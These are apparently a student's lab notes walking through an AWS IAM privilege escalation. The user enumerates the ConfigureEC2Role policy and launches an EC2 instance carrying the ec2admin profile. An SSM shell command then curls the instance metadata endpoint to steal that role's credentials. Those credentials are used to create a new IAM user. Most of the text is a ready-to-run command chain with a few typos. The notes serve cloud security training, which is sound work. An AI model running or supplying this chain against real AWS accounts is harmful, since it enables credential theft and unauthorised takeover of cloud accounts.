** Elevating user privileges based on ConfigureEC2Role policy **

Setting AWS Credentials  
`aws configure`

Listing policies attached to user
`aws iam list-attached-user-policies --user-name student`
![[Pasted image 20210503152625.png]]
Trying to create a new user - Failed
`aws iam create-user --user-name Bob`

Listing user policy details
`aws iam list-user-policies --user-name student`
Viewing details of ConfigureEC2Role policiy
`aws iam get-user-policy --user-name student --policy-name ConfigureEC2Role`
![[Pasted image 20210503153156.png]]

Listing roles
`aws list-roles`
We search ed2admin role
![[Pasted image 20210503153355.png]]
Listing policy details attached to role
`aws iam list-role-policies --role-name ec2admin`
![[Pasted image 20210503153513.png]]
`aws iam get-role-policy --role-name ec2admin --policy-name terraform-2021021213362984700000001`
![[Pasted image 20210503153634.png]]

Finding AMI ID
`aws ec2 describe-images --owners amazon --filter 'Name=name,Values=amzn-ami-hvm-*-x86_64-gp2' 'Name=state,Values=available' --output json | jq -r '.Images | sort_by(.CreationDate) | last(.[]).ImageId'`
Finding Subnet ID
`aws ec2 describe-subnets`
![[Pasted image 20210503154042.png]]
Listing security groups
`aws ec2 describe-security-groups`
![[Pasted image 20210503154207.png]]
Listing instance profiles
`aws iam list-instance-profiles`
![[Pasted image 20210503154316.png]]

Starting an ec2 instance
`aws ec2 run-instances --subnet-id subnet-0dfbb465103aa1c2d --image-id ami-0d08a21fc010da680 --iam-instance-profile Name=ec2_admin --instance-type t2.micro --security-group-ids "sg-0106a4a8e91b3a682"`
![[Pasted image 20210503154652.png]]

Executing commands on EC2 using SSM
`aws ssm send-command --document-name "AWS-RunShellScript" --parameters 'commands=["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2admin/"]' --targets "Key=instanceids,Values=i-0da83d9b4322af4fa" --coment "Retrieving Token"`
![[Pasted image 20210503155054.png]]
Getting command's output
`aws ssm get-command-invocation --command-id "0765bff4-4966-446f-4e0cdfee565f" --instance-id "i-0da83d9b4322af4fa"`
![[Pasted image 20210503155325.png]]

Assuming ec2admin role
Exporting environment variables
![[Pasted image 20210503155510.png]]
`aws sts get-caller-identity`
![[Pasted image 20210503155600.png]]

Confirming privileged access - Success
`aws iam create-user --user-name Bob`
![[Pasted image 20210503155702.png]]